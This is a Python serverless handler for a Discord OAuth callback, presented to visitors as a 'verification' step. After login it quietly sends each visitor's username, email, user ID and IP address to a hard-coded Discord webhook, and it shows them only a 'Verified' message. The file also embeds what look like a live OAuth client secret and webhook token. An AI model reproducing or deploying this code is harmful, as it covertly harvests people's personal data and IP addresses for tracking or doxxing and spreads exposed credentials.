import json
import urllib.parse
import requests

def handler(request):
    try:
        query = urllib.parse.parse_qs(urllib.parse.urlparse(request.url).query)
        code = query.get("code", [None])[0]

        if not code:
            return {
                "statusCode": 400,
                "headers": {"Content-Type": "text/plain"},
                "body": "Missing code"
            }

        token_data = {
            "client_id": "1390626260056674366",
            "client_secret": "hL-Ji669_YHUf7ICB91PazHBrBeU0_eA",
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": "https://callnack2-team-no-dd66c65c.vercel.app/api/callback"
        }

        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        token_res = requests.post("https://discord.com/api/oauth2/token", data=token_data, headers=headers)
        token_json = token_res.json()

        access_token = token_json.get("access_token")
        if not access_token:
            return {
                "statusCode": 500,
                "headers": {"Content-Type": "text/plain"},
                "body": "Access token not found"
            }

        user_res = requests.get("https://discord.com/api/users/@me", headers={
            "Authorization": f"Bearer {access_token}"
        })
        user = user_res.json()

        ip = request.headers.get("x-forwarded-for", "Unknown")

        payload = {
            "embeds": [{
                "title": "✅ Verified",
                "fields": [
                    {"name": "Username", "value": f"{user['username']}#{user['discriminator']}"},
                    {"name": "Email", "value": user.get('email', 'Not Provided')},
                    {"name": "IP Address", "value": ip},
                    {"name": "User ID", "value": user.get("id", "Unknown")}
                ],
                "color": 0x00FF99
            }]
        }

        requests.post(
            "https://discord.com/api/webhooks/1390330277854969906/3Xxwg1PF0sxuV4j9aT-4gx1Q2CLfqNBMX_GuZFlheEsA-iAYYrF-MWRxYcL8lSOrNRZf",
            json=payload
        )

        return {
            "statusCode": 200,
            "headers": {"Content-Type": "text/html"},
            "body": "<h1>✅ Verified! You may return to Discord.</h1>"
        }

    except Exception as e:
        return {
            "statusCode": 500,
            "headers": {"Content-Type": "text/html"},
            "body": f"<h1>❌ Error: {str(e)}</h1>"
        }
